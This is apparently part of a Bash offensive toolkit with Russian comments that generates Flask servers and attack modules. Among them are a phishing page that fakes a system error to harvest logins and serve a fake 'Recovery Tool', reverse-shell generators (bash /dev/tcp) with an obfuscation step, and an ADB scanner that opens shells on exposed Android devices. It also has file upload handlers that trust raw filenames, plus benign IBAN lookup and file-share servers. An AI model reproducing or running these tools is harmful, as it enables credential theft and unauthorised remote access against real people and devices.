        body { background: var(--bg); color: #e0e0e0; font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
        .prime-card { background: var(--glass); backdrop-filter: blur(12px); border: 1px solid rgba(255,255,255,0.1); border-radius: 1.5rem; padding: 2rem; width: 95%; max-width: 900px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h2 { background: linear-gradient(to right, #fff, var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; }
        
        /* Адаптивная сетка Share */
        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
        .file-item { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 1rem; padding: 1rem; text-align: center; transition: 0.2s; text-decoration: none; color: inherit; }
        .file-item:hover { border-color: var(--accent); background: rgba(0,255,65,0.05); transform: translateY(-3px); }
        .file-icon { font-size: 2rem; margin-bottom: 0.5rem; display: block; }
        
        /* Умный Drag & Drop */
        .drop-zone { border: 2px dashed rgba(0,255,65,0.3); border-radius: 1rem; padding: 2rem; transition: 0.3s; cursor: pointer; position: relative; }
        .drop-zone--over { border-color: var(--accent); background: rgba(0,255,65,0.05); box-shadow: inset 0 0 20px rgba(0,255,65,0.1); }
        .drop-zone__input { display: none; }
        
        button { background: var(--accent); color: #000; border: none; padding: 10px 20px; border-radius: 0.5rem; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        button:hover { opacity: 0.8; transform: scale(1.01); }
        pre { background: #000; color: #0cf; padding: 1rem; border-radius: 0.5rem; overflow: auto; max-height: 300px; font-size: 0.8rem; border-left: 3px solid var(--accent); }
    </style>
    """
    return f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        {style}
    </head>
    <body>
        <div class="prime-card">
            <small style="color:var(--accent); letter-spacing:2px;">SECURE_UPLINK_v4.2</small>
            <h2>{title}</h2>
            {content}
        </div>
    </body>
    </html>
    """
EOF
}



# --- py functions ---
# ==============================================================================
# @description: Функция-генератор контента для IBAN/RIB (ИНТЕГРИРОВАННАЯ v2.0)
# Полная изоляция логики, встроенная валидация MOD-97 и снайперский REST-парсинг.
# ==============================================================================
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"

    # --- Подготовка динамических данных из глобальных матриц ядра ---
    local python_sources=""
    local entry

    # 1. Формируем список источников для Python на основе GLOBAL_API_FINANCE_NODES
    for entry in "${GLOBAL_API_FINANCE_NODES[@]}"; do
        local url="${entry%%|*}"
        # Пропускаем СНГ-специфичные API БИК, так как они требуют другой логики парсинга JSON
        if [[ "$url" == *"bik-info"* || "$url" == *"gasi.gov.ru"* ]]; then
            continue
        fi
        python_sources+="    \"$url\",\n"
    done
    # Очищаем финальный перенос строки
    python_sources=$(echo -e "$python_sources" | sed '$d')

    # 2. Формируем локальный словарь банков для Python из GLOBAL_BANK_MATRIX
    local python_bank_dict=""
    for entry in "${GLOBAL_BANK_MATRIX[@]}"; do
        local code="${entry%%|*}"
        local tail="${entry#*|}"
        local name="${tail%%|*}"
        # Защищаем кавычки внутри названий банков во избежание поломки синтаксиса Python
        name=$(echo "$name" | sed 's/"/\\"/g')
        python_bank_dict+="    \"$code\": \"$name\",\n"
    done
    python_bank_dict=$(echo -e "$python_bank_dict" | sed '$d')

    # --- Генерация контента файла через защищенный стрим ---
    local code
    code=$(cat << EOF
import sys, re, json, time
from urllib.request import Request, urlopen
from urllib.error import URLError

# Динамически импортированные зеркала верификации из GLOBAL_API_FINANCE_NODES
SOURCES = [
$python_sources
]

# Локальный справочник идентификаторов из GLOBAL_BANK_MATRIX
LOCAL_BANKS = {
$python_bank_dict
}

def validate_iban_checksum(iban):
    """Математическая валидация контрольной суммы по стандарту ISO 7064 (MOD-97)"""
    if len(iban) < 5:
        return False
    # Переносим первые 4 символа в конец строки
    rearranged = iban[4:] + iban[:4]
    # Переводим буквы в цифры (A=10, B=11, ..., Z=35)
    numeric_string = ""
    for char in rearranged:
        if char.isalpha():
            numeric_string += str(ord(char) - 55)
        else:
            numeric_string += char
    try:
        return int(numeric_string) % 97 == 1
    except ValueError:
        return False

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System с интеллектуальной сборкой URL)"""
    ua_string = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    
    for base_url in SOURCES:
        try:
            # Интеллектуальный роутинг URL в зависимости от типа API-эндпоинта
            if base_url.endswith("=") or "html" in base_url or "?" in base_url:
                url = f"{base_url}{iban}"
            else:
                # Если эндпоинт RESTful чистый, добавляем разделитель пути безопасности
                url = f"{base_url.rstrip('/')}/{iban}"
                
            req = Request(url, headers={'User-Agent': ua_string, 'Accept': 'application/json'})
            with urlopen(req, timeout=5) as response:
                return json.loads(response.read().decode('utf-8', errors='ignore'))
        except Exception:
            # Перехватываем строго системные исключения, оставляя возможность Ctrl+C
            continue
    return None

def get_country_format(iban):
    """Глубокий математический разбор структуры по национальным стандартам SEPA"""
    country = iban[:2]
    formats = {
        'FR': {'name': 'France (RIB Standard)', 'len': 27, 'parse': lambda i: f"Code Banque: {i[4:9]}, Code Guichet: {i[9:14]}, Numéro de Compte: {i[14:25]}, Clé RIB: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ (Bankleitzahl): {i[4:12]}, Account Number: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Account Number: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Account: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank Code: {i[4:8]}, Branch Code: {i[8:12]}, Control Digits: {i[12:14]}, Account: {i[14:24]}"},
        'CH': {'name': 'Switzerland', 'len': 21, 'parse': lambda i: f"Bank Clearing Code: {i[4:9]}, Account: {i[9:21]}"},
        'BE': {'name': 'Belgium', 'len': 16, 'parse': lambda i: f"National Bank Code: {i[4:7]}, Account: {i[7:14]}, Check Digits: {i[14:16]}"}
    }
    return formats.get(country, {'name': 'Other / International / Non-SEPA Zone', 'len': len(iban), 'parse': lambda i: f"BBAN (Basic Bank Account Number): {i[4:]}"})

def local_heuristic_search(iban):
    """Локальный поиск банка по сигнатурам Ядра при сбое внешней сети"""
    country = iban[:2]
    
    # Снайперский разбор национального префикса эмитента
    if country == "FR":
        bank_code = iban[4:9]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "DE":
        bank_code = iban[4:12]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
    elif country == "ES":
        bank_code = iban[4:8]
        if bank_code in LOCAL_BANKS: return LOCAL_BANKS[bank_code]
        
    # Универсальный фолбэк-анализ по SWIFT/BIC маске в теле IBAN
    swift_prefix = iban[4:8]
    if swift_prefix in LOCAL_BANKS:
        return LOCAL_BANKS[swift_prefix]
        
    return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\033[91m[-] CRITICAL ERROR: Идентификатор цели (IBAN/RIB) не передан в командную строку.\033[0m")
        sys.exit(1)
        
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v$v_num: GLOBAL FINANCIAL INTELLIGENCE ---\033[0m")
    
    # Выполнение базовой математической проверки чексуммы ISO
    is_valid_checksum = validate_iban_checksum(target)
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96m[i] Национальная зона :\033[0m {fmt['name']}")
    print(f"\033[96m[i] Длина расчетная   :\033[0m {len(target)} символов (Ожидалось: {fmt['len']})")
    print(f"\033[96m[i] Декомпозиция тракта:\033[0m {fmt['parse'](target)}")
    
    if not is_valid_checksum:
        print(f"\n\033[1;31m[!] ВНИМАНИЕ: Математическая проверка MOD-97 провалена. Неверная контрольная сумма!\033[0m")
    else:
        print(f"\033[1;32m[+] Математическая валидация по стандарту ISO 7064: УСПЕШНО\033[0m")

    # 2. Локальный оффлайн-поиск по сигнатурным картам Ядра
    local_bank = local_heuristic_search(target)
    if local_bank:
        print(f"\033[92m[+] Локальный фингерпринт Ядра подтвержден:\033[0m {local_bank}")

    # 3. Агрегация данных из внешних динамических источников через каскад зеркал
    print(f"[*] Синхронизация с каскадом внешних финансовых шлюзов API...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', local_bank if local_bank else 'N/A')).upper()
        bic = data.get('bic', data.get('swift', 'N/A')).upper()
        city = data.get('city', data.get('address', 'N/A')).upper()
        
        print(f"\n\033[1;32m[+] ФИНАНСОВЫЙ СТАТУС ВЕРИФИЦИРОВАН МУЛЬТИ-ШЛЮЗОМ\033[0m")
        print(f"  🏦 Эмитент (Bank): {bank_name}")
        print(f"  🔑 Код BIC/SWIFT : {bic}")
        print(f"  📍 Локация/Город : {city}")

        if provided_name != "NONE":
            print(f"\n\033[1;35m--- СМАРТ-ОТЧЕТ КОЛИНЕАРНОСТИ (SMART MATCH) ---\033[0m")
            print(f"  Заявленный бенефициар: {provided_name}")
            if bank_name != 'N/A':
                print(f"  ✅ Верификация тракта: Концевой шлюз *{target[-4:]} успешно сопоставлен с {bank_name}")
                print(f"  ℹ️ Статус комплаенса: Профиль '{provided_name}' допущен к финансовым операциям в регионе.")
    else:
        if local_bank:
            print(f"\n\033[1;33m[!] ИНФОРМАЦИЯ: Внешние API не ответили, применен эвристический фингерпринт Ядра\033[0m")
            print(f"  🏦 Эмитент (Heuristic): {local_bank.upper()}")
        else:
            print(f"\n\033[91m[-] ТРЕВОГА: Сбой всех внешних шлюзов, локальные совпадения не найдены.\033[0m")
EOF
)

    # Запись сгенерированного скрипта на диск через smart_cat Ядра
    smart_cat "$target_file" "$code"
}

# Функция-генератор для AV-Server (v1.2)
# --- ГЕНЕРАТОР МОДУЛЯ AV-SCANNER (SECURITY HUB) ---
generate_av_server_code_raw() {
    # Загружаем UI шаблоны в переменные
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    # Выбрасываем код прямо в stdout (через cat без записи в файл)
    cat << EOF
from flask import Flask, request, render_template_string
import subprocess, os, shutil

app = Flask(__name__)
CLAM_PATH = shutil.which('clamdscan') or shutil.which('clamscan') or '/usr/bin/clamscan'

$templates

@app.route('/')
def index():
    fields = [
        {"type": "file", "name": "file", "label": "TARGET_OBJECT_FOR_ANALYSIS"}
    ]
    form_html = render_prime_form("/scan", fields=fields, btn_text="INITIATE DEEP SCAN")
    return render_template_string(render_prime_page("SECURE_GATEWAY", form_html))

@app.route('/scan', methods=['POST'])
def scan():
    f = request.files.get('file')
    if not f: return "No data", 400
    
    tmp_path = os.path.join('/tmp', f.filename)
    f.save(tmp_path)
    
    try:
        cmd = [CLAM_PATH, '--no-summary', tmp_path]
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        scan_output = res.stdout if res.stdout else res.stderr
        if not scan_output and res.returncode == 0:
            scan_output = f"{f.filename}: OK"
    except Exception as e:
        scan_output = f"SYSTEM_ERROR: {str(e)}"
    finally:
        if os.path.exists(tmp_path): os.remove(tmp_path)

    is_infected = "FOUND" in scan_output or "Infected" in scan_output
    status_msg = "!!! THREAT DETECTED !!!" if is_infected else "SECURE_VERIFIED"
    status_class = "infected" if is_infected else "clean"

    content = f"""
    <div class="status-box {status_class}">{status_msg}</div>
    <pre>{{{{ output }}}}</pre>
    <a href="/" class="btn">[ RETURN ]</a>
    """
    return render_template_string(render_prime_page("SCAN_RESULTS", content), output=scan_output)

if __name__ == '__main__':
    # В режиме Live/Memory SSL сертификаты (файлы) опциональны. 
    # Запускаем чистый HTTP для максимальной скорости на Wiko.
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF
}


# Функция-генератор для Share-Server (v1.0)
# --- ГЕНЕРАТОР МОДУЛЯ SHARE-SERVER (SHARE SECTOR) ---
generate_share_server_code_raw() {
    # Загружаем только базовый шаблон страницы
    local template=$(generate_core_template)

    cat << EOF
from flask import Flask, render_template_string, send_from_directory
import os

app = Flask(__name__)
SHARE_DIR = '/root/share'

if not os.path.exists(SHARE_DIR):
    os.makedirs(SHARE_DIR, exist_ok=True)

$template

def get_file_icon(filename):
    """Определяет иконку в зависимости от расширения файла."""
    ext = filename.split('.')[-1].lower() if '.' in filename else ''
    icons = {
        'pdf': '📕',
        'jpg': '🖼️', 'jpeg': '🖼️', 'png': '🖼️', 'gif': '🖼️', 'webp': '🖼️',
        'zip': '📦', 'rar': '📦', '7z': '📦', 'tar': '📦', 'gz': '📦',
        'py': '💻', 'js': '💻', 'html': '💻', 'sh': '💻', 'css': '💻',
        'txt': '📄', 'md': '📝', 'doc': '📄', 'docx': '📄',
        'mp4': '🎬', 'mkv': '🎬', 'mov': '🎬',
        'mp3': '🎵', 'wav': '🎵', 'flac': '🎵'
    }
    return icons.get(ext, '📄')

@app.route('/')
def index():
    try:
        files = sorted(os.listdir(SHARE_DIR))
    except:
        files = []
    
    # Формируем сетку файлов с использованием новых стилей .file-grid и .file-item
    grid_content = '<div class="file-grid">'
    for f in files:
        icon = get_file_icon(f)
        grid_content += f"""
        <a href="/get/{f}" class="file-item" target="_blank">
            <span class="file-icon" style="font-size: 2.5rem; display: block; margin-bottom: 10px;">{icon}</span>
            <div style="font-size: 0.8rem; word-break: break-all; line-height: 1.2;">{f}</div>
        </a>
        """
    
    if not files:
        grid_content += '<p style="color: var(--accent); font-style: italic; grid-column: 1/-1; opacity: 0.5;">[ SECTOR_EMPTY: No data detected ]</p>'
    
    grid_content += '</div>'
    grid_content += f'<div style="margin-top: 30px; padding-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); font-family: monospace; font-size: 0.7rem; opacity: 0.5;">MOUNT_POINT: {SHARE_DIR}</div>'

    return render_template_string(render_prime_page("SECURE_FILE_DISTRIBUTION", grid_content))

@app.route('/get/<filename>')
def get_file(filename):
    return send_from_directory(SHARE_DIR, filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002, debug=False)
EOF
}


# Функция-генератор для Upload-Server (v1.0)
generate_upload_server_code_raw() {
    local templates="$(generate_core_template)
$(generate_core_form_template)"

    cat << EOF
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
# Сохраняем во входящую папку внутри PRIME_LOOT
UPLOAD_DIR = os.path.join(os.environ.get('PRIME_LOOT') or '/root/prime_loot', 'inbound')

if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR, exist_ok=True)

$templates

@app.route('/')
def index():
    fields = [{"type": "file", "name": "file", "label": "SELECT_UPLINK_DATA"}]
    form_html = render_prime_form("/upload", fields=fields, btn_text="INITIATE UPLOAD")
    return render_template_string(render_prime_page("INBOUND_DROP_BOX", form_html))

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files: return "TRANSFER_ERROR", 400
    f = request.files['file']
    if f.filename == '': return "EMPTY_FILENAME", 400
    
    f.save(os.path.join(UPLOAD_DIR, f.filename))
    return "SUCCESS: File received in secure sector."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=False)
EOF
}




generate_phantom_server_code() {
    local target_file="$1"
    local mode="$2"
    local layout=$(generate_core_template)

    cat << EOF > "$target_file"
from flask import Flask, request, render_template_string, send_from_directory
import os

app = Flask(__name__)
LOOT = "$LOOT_DIR/phantom_loot.log"

$layout

@app.route('/')
def index():
    content = """
    <div class="status-box infected">CRITICAL SYSTEM ERROR: 0x80041F</div>
    <p style='color:#888;'>Security token expired. Re-authentication required.</p>
    <form method='post' action='/auth'>
        <input type='text' name='u' placeholder='System ID / Email' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%; margin-bottom:10px;'>
        <input type='password' name='p' placeholder='Secure Key' required style='background:#000; color:#0cf; border:1px solid #333; padding:10px; width:85%;'>
        <button type='submit'>VERIFY & RECOVER</button>
    </form>
    """
    if "$mode" != "creds":
        content += "<p style='margin-top:20px; font-size:0.7em;'>Or download <a href='/download' style='color:#00ff41;'>Recovery Tool</a>.</p>"
    
    return render_template_string(render_prime_page("PHANTOM_RECOVERY_NODE", content))

@app.route('/auth', methods=['POST'])
def auth():
    with open(LOOT, "a") as f:
        f.write(f"[AUTH] {request.remote_addr} | U: {request.form.get('u')} | P: {request.form.get('p')}\n")
    return render_template_string(render_prime_page("ACCESS_DENIED", "<div class='status-box infected'>INVALID CREDENTIALS</div><a href='/' class='btn'>RETRY</a>"))

@app.route('/download')
def download():
    return send_from_directory("$LOOT_DIR", "update_installer.sh", as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
}



# ==========================================
# 2. РАБОЧИЕ ФУНКЦИИ (Используют ядро)
# ==========================================


run_system_pulse() {
    # Слой 1: Заголовок и статус через Голос [1]
    core_engine_ui "SECTOR Z: LIVE SYSTEM PULSE"
    core_engine_ui "Monitoring filesystem events and net-connections..."
    
    # Слой 2: Сетевые соединения
    # Используем узел [12] для акцента на NET
    echo -e "${Y}[NETWORK CONNECTIONS]:${NC}"
    # Очищаем вывод через sed, сохраняя твой фильтр
    ss -tunp | grep -v "127.0.0.1" | head -n 10 | sed 's/^/  /'
    
    # Слой 3: Визуальный разделитель [9]
    core_engine_wait "L" # Рисуем линию
    
    # Слой 4: Живой мониторинг
    core_engine_ui "w" "Watching file activity (Ctrl+C to stop)"
    
    # Используем переменную из нашей структуры (PRIME_LOOT -> из конфига или локальная)
    local loot_path="${BASE_DIR:-./}/prime_loot"
    
    # Запускаем мониторинг
    watch -n 2 "ls -lt /tmp $loot_path 2>/dev/null | head -n 15"
}



# Вспомогательные функции-мостики (для чистоты кода)
pc_gen_payload() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PAYLOAD GENERATOR"

    # Слой 2: Автоматическое определение LHOST (без ifconfig/awk)
    # Используем логику из узла [12] для получения активного IP
    local l_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' || echo "127.0.0.1")
    
    echo -e "${Y}Detected LHOST:${NC} $l_ip"

    # Слой 3: Защищенный ввод порта через Органы чувств [3] и Мозг [5]
    local l_port=$(core_engine_input "select" "Enter LPORT (Default: 4444)")
    [[ -z "$l_port" ]] && l_port="4444"

    # Слой 4: Синхронизация через узел [13]
    core_engine_progress 3 "COMPILING REVERSE SHELL"

    # Слой 5: Вывод результата (Стерильный поток)
    echo -e "\n${G}RAW BASH:${NC}"
    # Мутируем только ключевые слова для обхода простейших фильтров через узел [4]
    local cmd="bash -i >& /dev/tcp/$l_ip/$l_port 0>&1"
    echo -e "${W}$cmd${NC}\n"

    # Финализация через Барьер [9]
    core_engine_wait
}

# Редиректы на существующие модули, чтобы не дублировать код
pc_steal_creds() { run_pc_recovery_ultimate; }
pc_post_exploit() { run_forensic_scanner; }



# --- Модули по меню ---

run_forensic_scanner() {
    core_engine_ui "AUTONOMOUS DEFENSE & REMEDIATION"
    
    # 1. Транспорт (Интерфейс выбора целевой среды)
    core_engine_item "L" "Local" "Текущая операционная система"
    core_engine_item "A" "Android/IoT" "Удаленная зачистка через шину ADB/USB"
    core_engine_item "S" "Remote Server" "Инфраструктурный узел через SSH"
    core_engine_item "B" "Back" "Вернуться в главное меню лаунчера"
    
    local target=$(core_engine_input "select" "Укажите вектор сканирования")
    [[ "$target" == "b" || -z "$target" ]] && return
    
    local cmd_p=""
    case "$target" in
        "a")
            core_engine_validator "pkg" "adb" "Компонент сопряжения ADB" || return
            core_engine_ui "i" "Ожидание инициализации IoT/Android устройства в шине USB..."
            adb wait-for-device
            cmd_p="adb shell" 
            ;;
        "s")
            local rh=$(core_engine_input "text" "Введите адрес удаленного узла (User@IP)")
            [[ -z "$rh" ]] && return
            cmd_p="ssh -o ConnectTimeout=5 $rh" 
            ;;
    esac

    core_engine_progress 5 "ENGAGING AUTONOMOUS PURGE ENGINE"

    # ==========================================================================
    # --- ФАЗА 1: СНАЙПЕРСКАЯ НЕЙТРАЛИЗАЦИЯ АНОМАЛЬНЫХ ПРОЦЕССОВ ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 1: Анализ дерева процессов и поиск аномалий статики..."
    
    # Собираем данные: PID, STAT, COMMAND без awk, используя строго контролируемый формат ps
    local raw_procs
    raw_procs=$($cmd_p "ps -eo pid:10,stat:10,comm:30" 2>/dev/null)
    
    if [[ -z "$raw_procs" ]]; then
        # Фолбэк для урезанных сред Android (разбор упрощенного ps)
        raw_procs=$($cmd_p "ps" 2>/dev/null | tr -s ' ' | cut -d' ' -f2,3,9)
    fi

    local killed_count=0
    if [[ -n "$raw_procs" ]]; then
        # Построчный разбор пула процессов через изолированный subshell
        echo "$raw_procs" | tail -n +2 | while read -r p_pid p_stat p_comm; do
            [[ -z "$p_pid" || -z "$p_stat" ]] && continue
            
            # 1. Проверяем, соответствует ли статус процесса нашей глобальной матрице угроз
            if echo "$p_stat" | grep -Eq "$GLOBAL_REGEX_BAD_PROC_STATUS"; then
                # 2. Жесткая верификация по глобальному белому списку процессов ядра во избежание саботажа
                if echo "$p_comm" | grep -Eiq "$GLOBAL_REGEX_PROC_WHITELIST"; then
                    continue
                fi
                
                # Защита: Никогда не пытаемся убить PID 1 (системный инициализатор)
                [[ "$p_pid" -eq 1 ]] && continue
                
                core_engine_ui "w" "Автономная ликвидация угрозы: PID $p_pid [$p_comm], Статус: $p_stat"
                $cmd_p "kill -9 $p_pid" 2>/dev/null
                killed_count=$((killed_count + 1))
            fi
        done
    fi

    if [[ "$killed_count" -gt 0 ]]; then
        core_engine_ui "+" "Зачистка ветки процессов завершена. Нейтрализовано узлов: $killed_count"
    else
        core_engine_ui "+" "Дерево процессов стабильно. Критических аномалий не обнаружено."
    fi

    # ==========================================================================
    # --- ФАЗА 2: ИЗОЛЯЦИЯ ПОРТОВ И ПЕРЕХВАТ REVERSE-CHANNELS ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 2: Сетевой аудит и изоляция опасных сетевых интерфейсов..."
    
    # Сбор открытых портов (Поддержка как классического netstat, так и современного утилитарного ss)
    local open_ports
    open_ports=$($cmd_p "ss -ant -H" 2>/dev/null | tr -s ' ' | cut -d' ' -f4 | cut -d: -f2)
    if [[ -z "$open_ports" ]]; then
        open_ports=$($cmd_p "netstat -ant" 2>/dev/null | grep "LISTEN" | tr -s ' ' | cut -d' ' -f4 | rev | cut -d: -f1 | rev)
    fi

    for port in $open_ports; do
        # Игнорируем пустые строки
        [[ -z "${port// }" ]] && continue
        
        # 1. Проверяем, находится ли порт в черном списке глобальной матрицы
        if echo "$port" | grep -Eq "$GLOBAL_REGEX_DANGER_PORTS"; then
            # 2. Перекрестная сверка с белым списком управления (Защита от блокировки SSH/ADB)
            if echo "$port" | grep -Eq "$GLOBAL_REGEX_PORT_WHITELIST"; then
                core_engine_ui "i" "Порт $port находится в Белом Списке управления. Блокировка отклонена."
                continue
            fi
            
            core_engine_ui "w" "ОБНАРУЖЕНА СТРУКТУРНАЯ УГРОЗА. Блокировка порта: $port"
            
            # Дифференцированная изоляция порта в зависимости от прав и типа ОС
            $cmd_p "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
            $cmd_p "fuser -k -n tcp $port" 2>/dev/null
        fi
    done
    core_engine_ui "+" "Сетевой периметр узла верифицирован и защищен."

    # ==========================================================================
    # --- ФАЗА 3: УМНЫЙ КАРАНТИН И СОХРАНЕНИЕ ЦЕЛОСТНОСТИ СИСТЕМЫ ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 3: Эвристический экспресс-анализ файловой системы (Карантин)..."
    
    # Определение путей сканирования на основе целевой платформы
    local s_path="/etc /usr/bin /tmp"
    local vault_dir="/root/quarantine_vault"
    
    if [[ "$target" == "a" ]]; then
        s_path="/data/local/tmp /data/system"
        vault_dir="/data/local/tmp/quarantine_vault"
    fi
    
    # Ищем файлы, измененные строго за последние 24 часа
    local suspect=$($cmd_p "find $s_path -maxdepth 3 -mtime -1 -type f 2>/dev/null")
    local quarantined_count=0

    if [[ -n "$suspect" ]]; then
        $cmd_p "mkdir -p $vault_dir" 2>/dev/null
        
        for file in $suspect; do
            [[ -z "$file" ]] && continue
            local fname=$(basename "$file")
            
            # 1. Защита критической инфраструктуры: сверка с матрицей исключений карантина
            if echo "$fname" | grep -Eiq "$GLOBAL_REGEX_QUARANTINE_WHITELIST"; then
                continue
            fi
            
            core_engine_ui "w" "Изоляция подозрительного объекта: $file -> Карантин"
            
            # Безопасное перемещение с полным обнулением прав исполнения (Нейтрализация payload)
            $cmd_p "mv $file $vault_dir/${fname}.dead && chmod 000 $vault_dir/${fname}.dead" 2>/dev/null
            quarantined_count=$((quarantined_count + 1))
        done
    fi

    if [[ "$quarantined_count" -gt 0 ]]; then
        core_engine_ui "+" "Подозрительные объекты успешно изолированы в репозиторий: $vault_dir"
    else
        core_engine_ui "+" "Целостность и неизменяемость системных директорий подтверждена."
    fi

    core_engine_ui "+" "Инфраструктурная очистка завершена. Статус узла: ОПТИМИЗИРОВАН/БЕЗОПАСЕН."
    core_engine_wait
}
run_ghost_commander() {
    core_engine_ui "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация ADB через Мозг [5]
    if ! core_engine_validator "pkg" "adb" "ADB Engine"; then
        core_engine_ui "e" "ADB not found. Initializing lightweight bridge..."
        core_engine_run "apt-get update && apt-get install android-sdk-platform-tools-common -y"
    fi

    # 2. Органы чувств [3]: Запрос цели
    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")

    # 3. Режим сканирования (через Глушитель [7])
    if [[ -z "$t_ip" ]]; then
        core_engine_ui "Scanning local network for ADB signatures..."
        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
        
        # Скан через nmap (если есть) или быстрый вывод
        nmap -p 5555 --open "$subnet.0/24" -n -Pn 2>/dev/null | grep "Nmap scan report" | cut -d' ' -f5
        core_engine_wait && return
    fi

    # 4. Проверка связи (Слой 2: Таймаут)
    core_engine_ui "Initializing ghost bridge to $t_ip:5555..."
    
    if ! timeout 2 bash -c "</dev/tcp/$t_ip/5555" 2>/dev/null; then
        core_engine_ui "w" "Target $t_ip:5555 seems offline."
        # Подтверждение через валидатор [5]
        core_engine_validator "read" "Force ghost-connect attempt?" || return
    fi

    # 5. Исполнение и Сбор трофеев [11]
    core_engine_ui "+" "Executing Ghost-Protocol to $t_ip..."
    core_engine_loot "ghost" "Session established: $t_ip"
    
    # Прямое подключение и вход в оболочку
    adb connect "$t_ip:5555" >/dev/null
    core_engine_ui "Dropping into Ghost Shell..."
    adb -s "$t_ip:5555" shell
    
    # 6. Стелс-финализация (Отключение без следов)
    adb disconnect "$t_ip:5555" >/dev/null 2>&1
    core_engine_wait
}




# --- [ SYSTEM UPDATE ENGINE v35.4 ] ---

run_update_prime() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "SYSTEM UPDATE & SYNC"
    
    local target="/root/launcher.sh"
    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local tmp="${target}.tmp"

    core_engine_ui "Connecting to GitHub..."

    # Слой 2: Безопасная загрузка через Глушитель [7]
    core_engine_run "curl -s -L $repo -o $tmp" "Fetching Repository Source"
    
    # Слой 3: Валидация данных через Мозг [5]
    # Проверяем существование и размер файла
    if ! core_engine_validator "file" "$tmp" "Repository Source"; then
        core_engine_remove "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 4: КРИТИЧЕСКИЙ ФИЛЬТР (Защита синтаксиса)
    # Проверка Bash-синтаксиса перед заменой живого ядра
    if ! bash -n "$tmp" 2>/dev/null; then
        core_engine_ui "e" "CRITICAL: Remote code is corrupted!"
        core_engine_remove "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 5: Атомарная замена и права через Санитара [8]
    core_engine_run "mv $tmp $target && chmod 755 $target && chown root:root $target 2>/dev/null" "Applying Atomic Update"

    # Слой 6: Восстановление среды (Alias & Symlink)
    if ! grep -q "alias launcher=" ~/.bashrc; then
        echo "alias launcher='bash $target'" >> ~/.bashrc
        core_engine_ui "y" "Alias 'launcher' restored in .bashrc"
    fi
    
    # Создаем системную ссылку через Глушитель
    core_engine_run "ln -sf $target /usr/local/bin/launcher && chmod +x /usr/local/bin/launcher" "Updating System Path"

    core_engine_ui "+" "Code updated, permissions set, alias active!"
    
    # Слой 7: Синхронизация и перезапуск [13]
    core_engine_progress 1 "System rebooting"
    
    # Полная очистка перед перезапуском [10]
    core_engine_clean_env
    
    # Мгновенная передача управления новому коду
    exec bash "$target"
}



# --- ENGINE: DYNAMIC POLYMORPHISM (ZERO-FOOTPRINT) ---

generate_poly_payload() {
    core_engine_ui "h" "PRIME POLYMORPH: GHOST PAYLOAD GENERATOR"
    
    # Слой 1: Ввод данных через стандартные Органы Чувств [3]
    local lhost=$(core_engine_input "text" "Enter local IP for Listener")
    [[ -z "$lhost" ]] && return
    
    local lport=$(core_engine_input "text" "Enter local Port")
    [[ -z "$lport" ]] && return

    local raw_payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    local output_file="$PRIME_LOOT/ghost_payload_$RANDOM.sh"

    # Слой 2: Визуализация процесса через новый прогресс-бар (В ОДНУ СТРОКУ)
    core_engine_progress 1 "POLYMORPH_ENGINE_INIT"

    # 1. Генерируем случайный ключ обфускации
